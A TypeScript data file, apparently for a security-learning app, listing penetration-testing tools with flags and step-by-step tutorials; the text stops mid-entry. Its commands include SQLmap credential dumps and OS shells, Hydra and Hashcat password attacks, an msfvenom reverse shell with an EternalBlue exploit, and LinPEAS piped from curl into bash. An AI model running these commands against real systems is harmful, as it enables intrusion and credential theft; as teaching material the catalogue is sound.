export interface ToolTutorialStep {
  stepNumber: number;
  title: string;
  explanation: string;
  command?: string;
  expectedOutputSnippet?: string;
}

export interface FlagExplanation {
  flag: string;
  label: string;
  description: string;
  example: string;
}

export interface DetailedCyberTool {
  id: string;
  name: string;
  category:
    | "Recon & OSINT"
    | "Web Security"
    | "Password Cracking"
    | "Network & Forensics"
    | "Exploitation"
    | "Reverse Engineering";
  summary: string;
  difficulty: "Beginner" | "Intermediate" | "Advanced";
  installCommand: string;
  syntaxPattern: string;
  whatIsIt: string;
  whenToUse: string;
  competingTools: string[];
  flags: FlagExplanation[];
  tutorialSteps: ToolTutorialStep[];
  proTips: string[];
}

export const DETAILED_TOOLS: DetailedCyberTool[] = [
  {
    id: "nmap",
    name: "Nmap (Network Mapper)",
    category: "Recon & OSINT",
    summary: "The industry-standard tool for network discovery, port scanning, and service version detection.",
    difficulty: "Beginner",
    installCommand: "sudo apt update && sudo apt install nmap",
    syntaxPattern: "nmap [scan_type] [options] <target_ip_or_range>",
    whatIsIt: "Nmap is an open-source network exploration scanner used by system administrators and security professionals to discover active devices on a network, detect open ports, identify running service versions, and test for vulnerabilities via scripts.",
    whenToUse: "Use Nmap as your first step in penetration testing or CTF challenges during the Initial Reconnaissance and Service Enumeration phases.",
    competingTools: ["RustScan", "Masscan", "Unicornscan"],
    flags: [
      { flag: "-sS", label: "SYN Stealth Scan", description: "Default TCP SYN scan mode (half-open connection; fast and stealthy, requires root).", example: "nmap -sS 192.168.1.1" },
      { flag: "-sV", label: "Service Version Detection", description: "Probes open ports to determine service names and version numbers.", example: "nmap -sV 192.168.1.1" },
      { flag: "-sC", label: "Default NSE Scripts", description: "Runs standard safe Nmap Scripting Engine (NSE) scripts for vulnerability banners.", example: "nmap -sC 192.168.1.1" },
      { flag: "-Pn", label: "Skip Host Discovery", description: "Treats all target hosts as online, bypassing ICMP ping firewall blocks.", example: "nmap -Pn 192.168.1.1" },
      { flag: "-p-", label: "Scan All Ports", description: "Scans all 65,535 TCP ports instead of just the default top 1,000 ports.", example: "nmap -p- 192.168.1.1" },
      { flag: "-A", label: "Aggressive Mode", description: "Enables OS detection, service versioning, NSE scripts, and traceroute simultaneously.", example: "nmap -A 192.168.1.1" },
      { flag: "-oN <file>", label: "Save Output File", description: "Exports scan findings to a normal text file for logging.", example: "nmap -sV -oN scan.txt 192.168.1.1" },
    ],
    tutorialSteps: [
      {
        stepNumber: 1,
        title: "Discover Active Live Hosts on Subnet",
        explanation: "Before scanning ports, perform a fast ping sweep to see which IP addresses are online.",
        command: "nmap -sn 192.168.1.0/24",
        expectedOutputSnippet: "Nmap scan report for 192.168.1.50\nHost is up (0.00045s latency).\nNmap scan report for 192.168.1.100\nHost is up (0.0012s latency).",
      },
      {
        stepNumber: 2,
        title: "Scan Common TCP Ports & Service Versions",
        explanation: "Run version detection (`-sV`) and default scripts (`-sC`) against open ports.",
        command: "nmap -sC -sV 192.168.1.50",
        expectedOutputSnippet: "PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41",
      },
      {
        stepNumber: 3,
        title: "Perform Deep Scan Across All 65,535 Ports",
        explanation: "Check non-standard high ports (like 8080, 8443, 9000, 31337) that attackers might use.",
        command: "nmap -p- -T4 192.168.1.50",
        expectedOutputSnippet: "Scanning 192.168.1.50 [65535 ports]\nDiscovered open port 8080/tcp\nDiscovered open port 31337/tcp",
      },
      {
        stepNumber: 4,
        title: "Run Automated Vulnerability Signature Checks",
        explanation: "Execute Nmap NSE vulnerability scripts (`--script vuln`) to check for CVE security flaws.",
        command: "nmap -sV --script vuln 192.168.1.50",
        expectedOutputSnippet: "| http-vuln-cve2017-5638: Apache Struts RCE Vulnerable!\n| VULNERABLE: Remote Code Execution",
      },
    ],
    proTips: [
      "Always save scan output with `-oN scan.txt` or `-oX scan.xml` so you can parse findings later.",
      "If ICMP ping is blocked by a firewall, add `-Pn` to force Nmap to scan open TCP ports anyway.",
    ],
  },
  {
    id: "gobuster",
    name: "Gobuster Directory & Subdomain Fuzzer",
    category: "Web Security",
    summary: "High-speed directory, file, and DNS subdomain brute-forcing tool written in Go.",
    difficulty: "Beginner",
    installCommand: "sudo apt install gobuster",
    syntaxPattern: "gobuster [dir|dns|vhost] -u <target_url> -w <wordlist_path> [options]",
    whatIsIt: "Gobuster is a fast command-line utility used to brute-force web URIs (directories and files), DNS subdomains, and virtual host names against web applications.",
    whenToUse: "Use Gobuster during Web Application Penetration Testing after discovering a web server port (like HTTP 80/8080 or HTTPS 443) to find hidden pages, admin portals, or sensitive backup files.",
    competingTools: ["Ffuf", "Dirsearch", "Feroxbuster", "Wfuzz"],
    flags: [
      { flag: "dir", label: "Directory Mode", description: "Brute-force HTTP web directory paths and filenames.", example: "gobuster dir -u http://target/ -w wordlist.txt" },
      { flag: "dns", label: "DNS Mode", description: "Brute-force subdomains against target domain.", example: "gobuster dns -d target.com -w subdomains.txt" },
      { flag: "-u <url>", label: "Target URL", description: "Base target URL endpoint to scan.", example: "gobuster dir -u http://192.168.1.50/" },
      { flag: "-w <path>", label: "Wordlist Path", description: "Path to dictionary file (e.g. /usr/share/wordlists/dirb/common.txt).", example: "gobuster dir -w /usr/share/wordlists/dirb/common.txt" },
      { flag: "-x <ext>", label: "File Extensions", description: "Comma-separated extensions to append (php,html,txt,json).", example: "gobuster dir -x php,html,txt,bak" },
      { flag: "-t <threads>", label: "Worker Threads", description: "Number of concurrent threads (default 10). Increase for speed.", example: "gobuster dir -t 50" },
      { flag: "-k", label: "Skip TLS Check", description: "Ignore invalid/self-signed SSL/TLS certificates.", example: "gobuster dir -k -u https://target/" },
    ],
    tutorialSteps: [
      {
        stepNumber: 1,
        title: "Standard Web Directory Scan",
        explanation: "Run Gobuster using the common wordlist to locate hidden web directories.",
        command: "gobuster dir -u http://192.168.1.50/ -w /usr/share/wordlists/dirb/common.txt",
        expectedOutputSnippet: "/admin (Status: 301)\n/images (Status: 301)\n/login.php (Status: 200)\n/robots.txt (Status: 200)",
      },
      {
        stepNumber: 2,
        title: "Scan with Specific File Extensions",
        explanation: "Append file extensions like `.php`, `.txt`, `.bak`, `.env` to discover backup configuration files.",
        command: "gobuster dir -u http://192.168.1.50/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,env",
        expectedOutputSnippet: "/.env (Status: 200) [Size: 420]\n/config.php.bak (Status: 200)\n/db_setup.sql (Status: 200)",
      },
      {
        stepNumber: 3,
        title: "Brute-Force DNS Subdomains",
        explanation: "Find unlinked subdomains (e.g. `dev.target.com`, `mail.target.com`) via DNS lookups.",
        command: "gobuster dns -d target.com -w /usr/share/wordlists/dnsmap.txt",
        expectedOutputSnippet: "Found: dev.target.com\nFound: staging.target.com\nFound: api.target.com",
      },
    ],
    proTips: [
      "Use `-b 404,403` to filter out default error status codes.",
      "If target is slow or rate-limited, lower thread count with `-t 5` to avoid server crashes or IP bans.",
    ],
  },
  {
    id: "sqlmap",
    name: "SQLmap (SQL Injection Automator)",
    category: "Web Security",
    summary: "Automatic SQL injection and database takeover engine supporting all major SQL engines.",
    difficulty: "Intermediate",
    installCommand: "sudo apt install sqlmap",
    syntaxPattern: "sqlmap -u <target_url_with_param> [options]",
    whatIsIt: "SQLmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers.",
    whenToUse: "Use SQLmap when you find a web page URL containing dynamic parameters (e.g. `item.php?id=1` or form POST parameters) that appear vulnerable to SQL injection.",
    competingTools: ["Commix", "Burp Suite Intruder", "jSQL Injection"],
    flags: [
      { flag: "-u <url>", label: "Target URL", description: "URL containing the GET parameter to test (e.g. ?id=1).", example: 'sqlmap -u "http://target/item.php?id=1"' },
      { flag: "--dbs", label: "Enumerate Databases", description: "Lists all database names accessible by current DB user.", example: "sqlmap -u URL --dbs" },
      { flag: "--tables", label: "Enumerate Tables", description: "Lists all table names inside a specified database (`-D db_name`).", example: "sqlmap -u URL -D app_db --tables" },
      { flag: "--dump", label: "Dump Table Content", description: "Extracts and prints rows from target database table.", example: "sqlmap -u URL -D app_db -T users --dump" },
      { flag: "--batch", label: "Non-Interactive Mode", description: "Automatically accepts default answers for interactive prompts.", example: "sqlmap -u URL --batch" },
      { flag: "--os-shell", label: "Spawn OS Command Shell", description: "Attempts to gain remote command shell access on the underlying OS.", example: "sqlmap -u URL --os-shell" },
    ],
    tutorialSteps: [
      {
        stepNumber: 1,
        title: "Test Parameter & List Accessible Databases",
        explanation: "Pass the vulnerable URL to SQLmap with `--dbs` to discover available database schemas.",
        command: 'sqlmap -u "http://192.168.1.50/product.php?id=1" --dbs --batch',
        expectedOutputSnippet: "[+] Parameter 'id' is vulnerable to SQL injection.\nAvailable databases [3]:\n[*] information_schema\n[*] site_db\n[*] mysql",
      },
      {
        stepNumber: 2,
        title: "List Tables in Target Database",
        explanation: "Specify target database (`-D site_db`) and request table enumeration (`--tables`).",
        command: 'sqlmap -u "http://192.168.1.50/product.php?id=1" -D site_db --tables --batch',
        expectedOutputSnippet: "Database: site_db\n[2 tables]\n+-----------------+\n| products        |\n| admin_users     |\n+-----------------+",
      },
      {
        stepNumber: 3,
        title: "Dump Credentials from Table",
        explanation: "Dump rows from `admin_users` table to extract cleartext logins or hashes.",
        command: 'sqlmap -u "http://192.168.1.50/product.php?id=1" -D site_db -T admin_users --dump --batch',
        expectedOutputSnippet: "+----+----------+----------------------------------+\n| id | username | password                         |\n+----+----------+----------------------------------+\n| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |\n+----+----------+----------------------------------+",
      },
    ],
    proTips: [
      "Save HTTP request files from Burp Suite (`request.txt`) and run `sqlmap -r request.txt` to test complex authenticated POST forms.",
    ],
  },
  {
    id: "hydra",
    name: "THC Hydra (Network Login Brute-Forcer)",
    category: "Password Cracking",
    summary: "Fast online network login brute-forcing tool supporting over 50 protocols.",
    difficulty: "Intermediate",
    installCommand: "sudo apt install hydra",
    syntaxPattern: "hydra -l <user> -P <wordlist> <target_ip> <protocol>",
    whatIsIt: "THC Hydra is a fast network authentication password cracker. It performs rapid dictionary and brute-force attacks against network services like SSH, FTP, HTTP POST forms, SMB, and MySQL.",
    whenToUse: "Use Hydra when you discover a remote login service (like SSH on port 22 or FTP on port 21) and want to test weak or default credentials.",
    competingTools: ["Medusa", "Ncrack", "Crowbar"],
    flags: [
      { flag: "-l <user>", label: "Single Username", description: "Specifies a single target login username.", example: "hydra -l admin -P rockyou.txt ssh://192.168.1.1" },
      { flag: "-L <file>", label: "Username List File", description: "Specifies a text file containing target usernames.", example: "hydra -L users.txt -P rockyou.txt 192.168.1.1 ssh" },
      { flag: "-P <file>", label: "Password Wordlist", description: "Specifies wordlist file path (e.g. rockyou.txt).", example: "hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh" },
      { flag: "-t <tasks>", label: "Parallel Tasks", description: "Number of parallel connection threads (default 16).", example: "hydra -l admin -P rockyou.txt -t 8 192.168.1.1 ssh" },
      { flag: "-vV", label: "Verbose Output", description: "Prints every attempted username/password combination.", example: "hydra -vV -l admin -P pass.txt 192.168.1.1 ftp" },
    ],
    tutorialSteps: [
      {
        stepNumber: 1,
        title: "Brute-Force SSH Service Login",
        explanation: "Run Hydra against SSH port using username `admin` and `rockyou.txt` password dictionary.",
        command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.50 -t 16",
        expectedOutputSnippet: "[DATA] max 16 tasks per 1 server\n[22][ssh] host: 192.168.1.50   login: admin   password: Password123\n1 of 1 target successfully completed, 1 valid password found",
      },
      {
        stepNumber: 2,
        title: "Brute-Force FTP Login Service",
        explanation: "Test username `root` or `ftp` against FTP protocol.",
        command: "hydra -l root -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.50",
        expectedOutputSnippet: "[21][ftp] host: 192.168.1.50   login: root   password: 123456",
      },
    ],
    proTips: [
      "Throttle parallel tasks with `-t 4` when attacking services with fail2ban rate-limiting to prevent IP lockout.",
    ],
  },
  {
    id: "hashcat",
    name: "Hashcat (GPU Password Cracker)",
    category: "Password Cracking",
    summary: "World's fastest GPU-accelerated password recovery engine supporting hundreds of hash algorithms.",
    difficulty: "Advanced",
    installCommand: "sudo apt install hashcat",
    syntaxPattern: "hashcat -m <mode_id> -a <attack_mode> <hash_file> <wordlist_path>",
    whatIsIt: "Hashcat is the world's fastest password recovery tool. It utilizes GPU hardware acceleration to crack captured offline hashes (MD5, NTLM, WPA2, Bcrypt, SHA-512) at billions of hashes per second.",
    whenToUse: "Use Hashcat during offline password cracking when you have extracted password hashes from a database, Active Directory SAM dump, or WPA2 wireless handshake file.",
    competingTools: ["John the Ripper", "Ophcrack"],
    flags: [
      { flag: "-m <mode>", label: "Hash Mode ID", description: "Specifies hash algorithm type (0=MD5, 1000=NTLM, 1800=Linux SHA512, 2500=WPA2).", example: "hashcat -m 1000 ntlm.txt rockyou.txt" },
      { flag: "-a 0", label: "Straight Wordlist Attack", description: "Straight dictionary wordlist attack mode.", example: "hashcat -a 0 -m 0 hashes.txt rockyou.txt" },
      { flag: "-a 3", label: "Brute-Force Mask Attack", description: "Mask brute-force mode (character set rules).", example: "hashcat -a 3 -m 0 hashes.txt ?l?l?l?l?d?d" },
      { flag: "-r <rule>", label: "Mutation Rules File", description: "Applies transformation rules (leet speak, capitalization) to wordlist.", example: "hashcat -m 0 hashes.txt rockyou.txt -r rules/best64.rule" },
      { flag: "--show", label: "Show Cracked Hashes", description: "Displays previously recovered cleartext passwords from potfile.", example: "hashcat -m 1000 hashes.txt --show" },
    ],
    tutorialSteps: [
      {
        stepNumber: 1,
        title: "Crack Windows NTLM Password Hashes",
        explanation: "Set hash mode `-m 1000` (NTLM) and straight dictionary mode `-a 0`.",
        command: "hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt",
        expectedOutputSnippet: "31d6cfe0d16ae931b73c59d7e0c089c0:Password123\ne582236d26732cf30a1099b24479e0f3:Welcome2026\nSession..........: hashcat\nStatus...........: Cracked",
      },
    ],
    proTips: [
      "Use `hashcat --example-hashes` to find the exact mode number for any hash format.",
    ],
  },
  {
    id: "wireshark",
    name: "Wireshark & TShark Network Packet Analyzer",
    category: "Network & Forensics",
    summary: "World's premier GUI packet analyzer and CLI TShark packet inspection utility.",
    difficulty: "Intermediate",
    installCommand: "sudo apt install wireshark tshark",
    syntaxPattern: "tshark -r <pcap_file> -Y <display_filter_expression>",
    whatIsIt: "Wireshark is the world's standard network protocol analyzer. It captures network traffic and lets you inspect packet headers, payloads, and protocols down to the byte level.",
    whenToUse: "Use Wireshark to analyze captured PCAP files from CTF forensics challenges, troubleshoot network anomalies, or capture cleartext traffic.",
    competingTools: ["Tcpdump", "NetworkMiner", "CapAnalysis"],
    flags: [
      { flag: "-r <file.pcap>", label: "Read PCAP File", description: "Loads captured packet trace file for offline inspection.", example: "tshark -r capture.pcap" },
      { flag: "-Y <expr>", label: "Display Filter", description: "Applies display filter string to isolate matching packets.", example: "tshark -r capture.pcap -Y 'http.request.method == \"POST\"'" },
      { flag: "-i <interface>", label: "Capture Interface", description: "Specifies network interface for live packet capture (e.g. eth0).", example: "tshark -i eth0 -w dump.pcap" },
    ],
    tutorialSteps: [
      {
        stepNumber: 1,
        title: "Filter Outbound HTTP POST Form Requests",
        explanation: "Isolate HTTP POST requests in a capture file to discover login attempts.",
        command: "tshark -r capture.pcap -Y 'http.request.method == \"POST\"'",
        expectedOutputSnippet: "12 0.4231 192.168.1.50 -> 192.168.1.100 HTTP POST /login.php HTTP/1.1",
      },
      {
        stepNumber: 2,
        title: "Search Raw Packets for 'password' String",
        explanation: "Inspect frame payload bytes for cleartext credential strings.",
        command: "tshark -r capture.pcap -Y 'frame contains \"password\"'",
        expectedOutputSnippet: "Payload bytes: USER=admin&PASS=SuperSecretPassword123!",
      },
    ],
    proTips: [
      "Use `Follow TCP Stream` in Wireshark GUI to reconstruct full text conversations between client and server.",
    ],
  },
  {
    id: "metasploit",
    name: "Metasploit Framework (msfconsole)",
    category: "Exploitation",
    summary: "Comprehensive penetration testing platform containing thousands of public exploit modules and payloads.",
    difficulty: "Advanced",
    installCommand: "sudo apt install metasploit-framework",
    syntaxPattern: "msfconsole -x \"use <module>; set RHOSTS <target>; exploit\"",
    whatIsIt: "Metasploit is the world's most used penetration testing platform. It provides an extensive database of verified exploits, payloads (`msfvenom`), auxiliary scanners, and post-exploitation Meterpreter handlers.",
    whenToUse: "Use Metasploit during the Exploitation phase after discovering vulnerable services (e.g., outdated SMB, Apache, vsftpd) to deliver payloads and gain shell access.",
    competingTools: ["Cobalt Strike", "Core Impact", "Canvas"],
    flags: [
      { flag: "search <query>", label: "Search Exploit Modules", description: "Searches exploit database by CVE or service keyword.", example: "search ms17-010" },
      { flag: "use <path>", label: "Select Exploit Module", description: "Loads specified module into active workspace.", example: "use exploit/windows/smb/ms17_010_eternalblue" },
      { flag: "set RHOSTS <ip>", label: "Set Target IP", description: "Configures remote target IP address.", example: "set RHOSTS 192.168.1.50" },
      { flag: "set PAYLOAD <path>", label: "Set Payload", description: "Specifies payload delivered upon successful exploit.", example: "set PAYLOAD windows/x64/meterpreter/reverse_tcp" },
      { flag: "exploit", label: "Run Weaponized Exploit", description: "Fires exploit module against target system.", example: "exploit" },
    ],
    tutorialSteps: [
      {
        stepNumber: 1,
        title: "Generate Linux Reverse Shell Payload with Msfvenom",
        explanation: "Compile a standalone Linux ELF binary payload to connect back to your listener.",
        command: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf",
        expectedOutputSnippet: "[+] Payload size: 74 bytes\n[+] Saved as: shell.elf",
      },
      {
        stepNumber: 2,
        title: "Launch MSFConsole & Execute Exploit",
        explanation: "Load MS17-010 EternalBlue exploit and set target remote host IP.",
        command: 'msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.50; exploit"',
        expectedOutputSnippet: "[*] Started reverse TCP handler on 10.0.0.1:4444\n[*] Win7 7601 Service Pack 1 x64 (64-bit)\n[+] Meterpreter session 1 opened!",
      },
    ],
    proTips: [
      "Use `background` inside Meterpreter to put active sessions in the background so you can interact with other targets.",
    ],
  },
  {
    id: "burpsuite",
    name: "Burp Suite Web Security Proxy",
    category: "Web Security",
    summary: "Leading web application security testing proxy, request manipulator, and vulnerability scanner.",
    difficulty: "Intermediate",
    installCommand: "sudo apt install burpsuite",
    syntaxPattern: "Route browser proxy -> 127.0.0.1:8080 -> Tweak HTTP Requests in Intercept/Repeater",
    whatIsIt: "Burp Suite is an integrated platform for performing security testing of web applications. Its proxy acts as a man-in-the-middle between browser and web server, allowing security researchers to inspect, alter, and replay HTTP traffic on the fly.",
    whenToUse: "Use Burp Suite whenever testing web application security (XSS, SQLi, IDOR, Authentication Bypass, CSRF, Parameter Tampering).",
    competingTools: ["OWASP ZAP", "Caido", "Fiddler"],
    flags: [
      { flag: "Proxy Intercept", label: "Pause Inbound/Outbound HTTP", description: "Intercepts client requests before hitting server to allow manual body parameter edits.", example: "Turn Intercept On in Burp Proxy" },
      { flag: "Repeater (Ctrl+R)", label: "Request Replayer", description: "Allows manually editing and resending individual HTTP requests to observe server outputs.", example: "Send request to Repeater" },
      { flag: "Intruder (Ctrl+I)", label: "Custom Payload Fuzzer", description: "Automated parameter dictionary and brute-force fuzzing tool.", example: "Set position markers §password§" },
    ],
    tutorialSteps: [
      {
        stepNumber: 1,
        title: "Intercept & Modify Web Request Parameters",
        explanation: "Configure browser proxy to `127.0.0.1:8080`, turn Intercept ON, change hidden form parameters before sending to server.",
        command: "Modify POST Body: price=100.00 -> price=0.01",
        expectedOutputSnippet: "HTTP/1.1 200 OK\nOrder processed successfully for $0.01!",
      },
    ],
    proTips: [
      "Install Burp's CA certificate in your browser to inspect HTTPS encrypted traffic seamlessly.",
    ],
  },
  {
    id: "linpeas",
    name: "LinPEAS (Linux Privilege Escalation Script)",
    category: "Exploitation",
    summary: "Automated script that searches for Linux privilege escalation vectors to gain root access.",
    difficulty: "Intermediate",
    installCommand: "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",
    syntaxPattern: "curl -sL https://.../linpeas.sh | bash",
    whatIsIt: "LinPEAS is a script that searches for privilege escalation vectors on Linux/Unix systems. It checks misconfigured SUID binaries, writable cron jobs, stored credentials, kernel exploits, and GTFOBins binaries.",
    whenToUse: "Use LinPEAS immediately after gaining initial low-privilege shell access on a Linux target to discover paths to escalate to `root`.",
    competingTools: ["LinEnum", "PrivescCheck", "LES (Linux Exploit Suggester)"],
    flags: [
      { flag: "-a", label: "All Checks", description: "Performs full thorough system privilege check.", example: "./linpeas.sh -a" },
      { flag: "-s", label: "Stealth Mode", description: "Reduces disk writes to evade basic log monitors.", example: "./linpeas.sh -s" },
    ],
    tutorialSteps: [
      {
        stepNumber: 1,
        title: "Execute LinPEAS Directly in Memory",
        explanation: "Run LinPEAS straight from URL stream without saving temporary files to disk.",
        command: "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash",
        expectedOutputSnippet: "==================== ( SUID - GTFOBins ) ====================\n[+] Vulnerable SUID binary found: /usr/bin/find (RED/YELLOW)",
      },
    ],
    proTips: [
      "Focus on RED/YELLOW highlighted text in LinPEAS output — 95% of privilege escalation vulnerabilities are color-coded in red.",
    ],
  },
  {
    id: "ghidra",
    name: "Ghidra (NSA Reverse Engineering Suite)",
    category: "Reverse Engineering",
    summary: "Software reverse engineering suite with decompiler and disassembler tools.",
    difficulty: "Advanced",
    installCommand: "sudo apt install ghidra",
    syntaxPattern: "ghidra -> Create Project -> Import Binary -> Auto-Analyze -> Read Decompiler",
    whatIsIt: "Ghidra is a software reverse engineering (SRE) framework developed by the NSA. It converts compiled binary executables (ELF, PE, Mach-O) back into structured, readable C pseudocode.",
    whenToUse: "Use Ghidra during Reverse Engineering and Malware Analysis CTFs to reverse binary assembly algorithms and extract hidden flags or password checks.",
    competingTools: ["IDA Pro", "Radare2", "Binary Ninja", "Cutter"],
    flags: [
      { flag: "Decompiler Window", label: "C Pseudocode Generator", description: "Translates assembly machine code back into readable C pseudocode.", example: "View Decompiler Window" },
      { flag: "Symbol Tree", label: "Functions & Imports", description: "Lists binary function names, imports, and global variables.", example: "Navigate Symbol Tree -> main" },
    ],
    tutorialSteps: [
      {
        stepNumber: 1,
        title: "Import Binary & Read Decompiled Pseudocode",
        explanation: "Open Ghidra, import binary, click Auto-Analyze, select function `main` in Symbol Tree, and read C pseudocode in Decompiler window.",
        command: "Decompiler: if (strcmp(input, \"SecretFlag123!\") == 0) { print(\"Access Granted\"); }",
        expectedOutputSnippet: "Revealed hardcoded password string: SecretFlag123!",
      },
    ],
    proTips: [
      "Press `R` key over any variable name in Ghidra to rename it and clarify the decompiled algorithm.",
    ],
  },
  {
    id: "shodan",
    name: "Shodan (Search Engine for IoT & Servers)",
    category: "Recon & OSINT",
    summary: "Search engine for Internet-connected devices, servers, webcams, open ports, and industrial control systems.",
    difficulty: "Beginner",
    installCommand: "pip install shodan",
    syntaxPattern: "shodan search [options] <query>  OR  shodan host <ip>",
    whatIsIt: "Shodan is a specialized search engine that scans the entire Internet continuously, gathering metadata banners from open ports (HTTP, SSH, FTP, RDP, RTSP webcams, MQTT, databases). The Shodan CLI allows querying this database directly from the terminal.",
    whenToUse: "Use Shodan during the Passive Reconnaissance phase to discover exposed servers, unpatched software versions, and public IP addresses belonging to a target organization without sending direct network packets to their firewalls.",
    competingTools: ["Censys", "BinaryEdge", "Zoomeye", "FOFA"],
    flags: [
      { flag: "search <query>", label: "Search Shodan Index", description: "Performs query search against Shodan database.", example: 'shodan search "port:21 anonymous"' },
      { flag: "host <ip>", label: "Inspect Host IP", description: "Displays all open ports, banners, and vulnerabilities for a specific IP.", example: "shodan host 192.168.1.50" },
      { flag: "count <query>", label: "Count Results", description: "Prints total number of matching hosts for a query.", example: 'shodan count "product:Apache"' },
      { flag: "myip", label: "Check Public IP", description: "Displays your current public IP address as seen by the Internet.", example: "shodan myip" },
      { flag: "stats <query>", label: "Generate Statistics", description: "Generates breakdown stats by country, port, or organization.", example: 'shodan stats --facets port org:"Target Corp"' },
    ],
    tutorialSteps: [
      {
        stepNumber: 1,
        title: "Initialize Shodan API Key",
        explanation: "Set up your free or pro Shodan API key in the command line.",
        command: "shodan init YOUR_SHODAN_API_KEY",
        expectedOutputSnippet: "[+] Successfully initialized Shodan API key!",
      },
      {
        stepNumber: 2,
        title: "Search for Unauthenticated FTP Servers",
        explanation: "Find public FTP servers allowing anonymous logins.",
        command: 'shodan search "port:21 anonymous"',
        expectedOutputSnippet: "192.168.1.10   21/tcp   220 (vsFTPd 2.3.4)\n10.0.0.45      21/tcp   220 Anonymous FTP server ready.",
      },
      {
        stepNumber: 3,
        title: "Inspect Specific Target IP Banners & Vulnerabilities",
        explanation: "Display open ports, operating system info, and known CVE vulnerabilities.",
        command: "shodan host 8.8.8.8",
        expectedOutputSnippet: "Host: 8.8.8.8\nOrganization: Google\nOpen Ports: 53, 443\nServices:\n53/udp - DNS (dnsmasq 2.80)",
      },
      {
        stepNumber: 4,
        title: "Search Exposed RDP Servers with Screenshots",
        explanation: "Locate Windows RDP servers exposed to the Internet.",
        command: 'shodan search "has_screenshot:true port:3389 country:US"',
        expectedOutputSnippet: "Matched 14,210 hosts with active desktop login screenshots.",
      },
    ],
    proTips: [
      "Use passive Shodan queries to audit your organization's internet exposure without triggering Intrusion Detection System (IDS) alerts.",
      "Combine filters like `org:\"Target Name\" port:22` to narrow down assets registered to a target company.",
    ],
  },
  {
    id: "censys",
    name: "Censys (Host & SSL Certificate OSINT)",
    category: "Recon & OSINT",
    summary: "Attack surface management search engine for analyzing internet hosts and SSL/TLS certificates.",
    difficulty: "Intermediate",
    installCommand: "pip install censys",
    syntaxPattern: "censys search \"<query>\"",
    whatIsIt: "Censys is an OSINT search engine that continually scans host addresses and SSL/TLS certificates across the public IPv4 space. It excels at uncovering real origin servers hidden behind CDN services like Cloudflare.",
    whenToUse: "Use Censys when investigating target domain infrastructures, finding unlinked SSL certificates, or locating origin IP addresses.",
    competingTools: ["Shodan", "BinaryEdge", "SecurityTrails"],
    flags: [
      { flag: "search", label: "Search Censys Index", description: "Performs structured search queries.", example: 'censys search "services.service_name: HTTP"' },
      { flag: "config", label: "Set API Credentials", description: "Configures API ID and Secret key.", example: "censys config" },
    ],
    tutorialSteps: [
      {
        stepNumber: 1,
        title: "Discover Origin IP Behind Cloudflare via SSL Certificate",
        explanation: "Search for target domain inside SSL certificate common names.",
        command: 'censys search "services.tls.certificates.leaf_data.subject.common_name: target.com"',
        expectedOutputSnippet: "[+] Host: 198.51.100.42 (Origin Server exposed)\nSubject CN: target.com\nIssuer: Let's Encrypt",
      },
    ],
    proTips: [
      "Check certificate SHA-256 fingerprints in Censys to map connected server clusters.",
    ],
  },
  {
    id: "sherlock",
    name: "Sherlock (Social Media Username OSINT)",
    category: "Recon & OSINT",
    summary: "Hunts down social media account profiles across 300+ websites by username.",
    difficulty: "Beginner",
    installCommand: "pip install sherlock-project",
    syntaxPattern: "sherlock <username> [options]",
    whatIsIt: "Sherlock is an open-source OSINT Python tool that searches over 300 social media platforms, forums, and technical networks (GitHub, Twitter, Reddit, Instagram, DockerHub, Keybase) to find accounts associated with a target username.",
    whenToUse: "Use Sherlock during the Initial OSINT phase when investigating a target individual's handle or alias during social engineering assessments, CTFs, or threat actor profiling.",
    competingTools: ["WhatsMyName", "Maigret", "Namechk"],
    flags: [
      { flag: "--print-found", label: "Print Matches Only", description: "Prints only valid account URL matches.", example: "sherlock target_user --print-found" },
      { flag: "--timeout <sec>", label: "Request Timeout", description: "Sets HTTP response timeout in seconds.", example: "sherlock target_user --timeout 5" },
      { flag: "--csv", label: "CSV Export", description: "Exports discovered social media links to CSV file.", example: "sherlock target_user --csv" },
      { flag: "-o <file>", label: "Output Text File", description: "Saves results to specified text file path.", example: "sherlock target_user -o output.txt" },
    ],
    tutorialSteps: [
      {
        stepNumber: 1,
        title: "Hunt Handle Across Social Platforms",
        explanation: "Execute Sherlock with target handle to find registered accounts.",
        command: "sherlock target_user --print-found",
        expectedOutputSnippet: "[+] GitHub: https://github.com/target_user\n[+] Reddit: https://www.reddit.com/user/target_user\n[+] Docker Hub: https://hub.docker.com/u/target_user\n[+] Keybase: https://keybase.io/target_user",
      },
    ],
    proTips: [
      "Cross-reference discovered social accounts to extract personal email addresses, PGP keys, or repository code leaks.",
    ],
  },
  {
    id: "spiderfoot",
    name: "SpiderFoot (Automated OSINT Intelligence)",
    category: "Recon & OSINT",
    summary: "Automated OSINT reconnaissance tool that queries 200+ public intelligence sources.",
    difficulty: "Intermediate",
    installCommand: "pip install spiderfoot",
    syntaxPattern: "spiderfoot -s <target> -m <modules>",
    whatIsIt: "SpiderFoot is an automated OSINT intelligence gathering framework. It automatically queries search engines, breach databases, Shodan, VirusTotal, and WHOIS servers for target domains, IP addresses, email addresses, or usernames.",
    whenToUse: "Use SpiderFoot to automate comprehensive passive intelligence collection during the initial target scoping phase.",
    competingTools: ["Maltego", "Recon-ng", "theHarvester"],
    flags: [
      { flag: "-s <target>", label: "Target Domain/IP", description: "Specifies target domain, IP address, or email.", example: "spiderfoot -s target.com" },
      { flag: "-m <mods>", label: "Select Modules", description: "Comma-separated list of active intelligence modules.", example: "spiderfoot -s target.com -m sfp_shodan,sfp_whois" },
      { flag: "-l <ip:port>", label: "Web UI Server", description: "Launches interactive browser Web UI.", example: "spiderfoot -l 127.0.0.1:5001" },
    ],
    tutorialSteps: [
      {
        stepNumber: 1,
        title: "Launch SpiderFoot Web UI Interface",
